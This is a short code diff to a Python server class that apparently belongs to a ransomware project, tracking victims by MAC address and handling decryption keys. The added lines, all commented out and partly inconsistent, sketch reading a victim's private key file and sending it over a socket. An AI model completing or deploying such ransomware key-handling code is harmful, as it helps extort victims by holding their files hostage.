@@ -158,7 +158,25 @@ class Server:
                     
                 else:
                     # sends decryption key  
-                    print("its in")            
+                    """ Opening and reading the private key file. """
+                    #file_path = os.path.join(Server.WORKING_DIR, victim_mac)
+                    #key_path = os.path.join(file_path, keyname)
+
+                    #priv_key = open(file_path, "r")
+                    #data = priv_key.read()
+
+                    """ Sending the filename to the server. """
+                    #self._socket.sendall(base64.b64encode(keyname.encode(Ransomware.ENCODING)))
+                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+                    #print(f"[CLIENT]: {msg}")
+
+                    """ Sending the file data to the server. """
+                    #self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
+                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
+                    #print(f"[CLIENT]: {msg}")
+        
+                    """ Closing the file. """
+                    #file.close()         
 
 
 if __name__ == '__main__':
